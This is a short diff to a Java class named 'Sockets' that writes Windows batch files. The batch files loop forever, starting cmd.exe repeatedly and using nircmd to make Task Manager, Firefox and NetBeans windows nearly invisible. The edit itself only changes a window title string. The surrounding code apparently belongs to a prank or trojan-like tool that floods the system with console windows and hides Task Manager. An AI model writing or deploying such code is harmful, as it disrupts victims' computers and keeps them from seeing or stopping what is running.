@@ -109,7 +109,7 @@ class Sockets
                 bw.write("@echo off" + nl +
                     ":A" + nl +
                     "start cmd.exe" + nl +
-                    Paths.get(".").toAbsolutePath().normalize().toString() + "\\nircmd.exe win trans ititle \"taskmanager\" 1" + nl +
+                    Paths.get(".").toAbsolutePath().normalize().toString() + "\\nircmd.exe win trans ititle \"task-manager\" 1" + nl +
                     "goto:A");
                 bw.close();
                 
@@ -143,7 +143,7 @@ class Sockets
                     "nircmd.exe win center alltop " + nl +
                     "nircmd.exe win trans ititle \"firefox\" 1" + nl +
                     "nircmd.exe win trans ititle \"netbeans\" 1" + nl +
-                    "nircmd.exe win trans ititle \"taskmanager\" 1" + nl +
+                    "nircmd.exe win trans ititle \"task-manager\" 1" + nl +
                     "goto:A");
                 bw.close();
                     
